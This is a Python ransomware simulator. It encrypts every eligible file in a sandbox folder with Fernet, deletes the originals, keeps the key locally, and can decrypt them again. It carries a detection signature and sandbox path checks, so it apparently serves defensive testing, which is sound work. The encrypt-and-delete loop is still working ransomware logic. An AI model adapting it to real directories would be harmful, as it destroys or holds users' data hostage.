import os
import sys
from cryptography.fernet import Fernet

# SAFETY MARKER — scanner/YARA will detect this string
SIMULATOR_SIGNATURE = "RANSOMWARE_SIMULATOR_DEMO_SAFE"

_SKIP_EXTENSIONS = {'.exe', '.py', '.sh', '.bat', '.spec', '.pyz', '.pkg', '.so', '.dll'}

class RansomwareSimulator:
    ENCRYPTED_EXT = ".encrypted"

    def __init__(self, sandbox_dir: str = None):
        base = os.path.dirname(os.path.abspath(__file__))
        self.sandbox_dir = sandbox_dir or os.path.join(base, "sandbox")
        self.key_file = os.path.join(self.sandbox_dir, ".ransom_key")
        self._key = None

    def _get_or_create_key(self) -> bytes:
        if self._key is not None:
            return self._key
        if os.path.exists(self.key_file):
            with open(self.key_file, "rb") as f:
                self._key = f.read()
        else:
            self._key = Fernet.generate_key()
            with open(self.key_file, "wb") as f:
                f.write(self._key)
        return self._key

    def _is_inside_sandbox(self, path: str) -> bool:
        real_sandbox = os.path.realpath(self.sandbox_dir)
        real_path = os.path.realpath(path)
        return real_path.startswith(real_sandbox + os.sep) or real_path == real_sandbox

    def encrypt(self):
        if not os.path.isdir(self.sandbox_dir):
            print(f"[ERROR] Sandbox directory not found: {self.sandbox_dir}")
            sys.exit(1)
        key = self._get_or_create_key()
        fernet = Fernet(key)

        for root, _, files in os.walk(self.sandbox_dir):
            for filename in files:
                ext = os.path.splitext(filename)[1].lower()
                if filename.endswith(self.ENCRYPTED_EXT) or filename == ".ransom_key" or ext in _SKIP_EXTENSIONS:
                    continue
                filepath = os.path.join(root, filename)
                if not self._is_inside_sandbox(filepath):
                    continue

                with open(filepath, "rb") as f:
                    data = f.read()
                encrypted = fernet.encrypt(data)

                enc_path = filepath + self.ENCRYPTED_EXT
                with open(enc_path, "wb") as f:
                    f.write(encrypted)
                os.remove(filepath)

        print(f"[SIMULATOR] {SIMULATOR_SIGNATURE}")
        print(f"[SIMULATOR] Files encrypted in: {self.sandbox_dir}")
        print(f"[SIMULATOR] Key saved to: {self.key_file}")

    def decrypt(self):
        if not os.path.isdir(self.sandbox_dir):
            print(f"[ERROR] Sandbox directory not found: {self.sandbox_dir}")
            sys.exit(1)
        if not os.path.exists(self.key_file):
            print("[ERROR] Key file not found. Cannot decrypt.")
            sys.exit(1)

        key = self._get_or_create_key()
        fernet = Fernet(key)

        for root, _, files in os.walk(self.sandbox_dir):
            for filename in files:
                if not filename.endswith(self.ENCRYPTED_EXT):
                    continue
                enc_path = os.path.join(root, filename)
                if not self._is_inside_sandbox(enc_path):
                    continue

                with open(enc_path, "rb") as f:
                    encrypted_data = f.read()
                try:
                    data = fernet.decrypt(encrypted_data)
                except Exception as e:
                    print(f"[ERROR] Failed to decrypt {enc_path}: {e}")
                    continue

                original_path = enc_path[:-len(self.ENCRYPTED_EXT)]
                with open(original_path, "wb") as f:
                    f.write(data)
                os.remove(enc_path)

        print("[SIMULATOR] Decryption complete.")


if __name__ == "__main__":
    sim = RansomwareSimulator()
    if len(sys.argv) > 1 and sys.argv[1] == "decrypt":
        print("[SIMULATOR] Decrypting files...")
        sim.decrypt()
    else:
        print("[SIMULATOR] Starting encryption (SANDBOX ONLY)...")
        sim.encrypt()
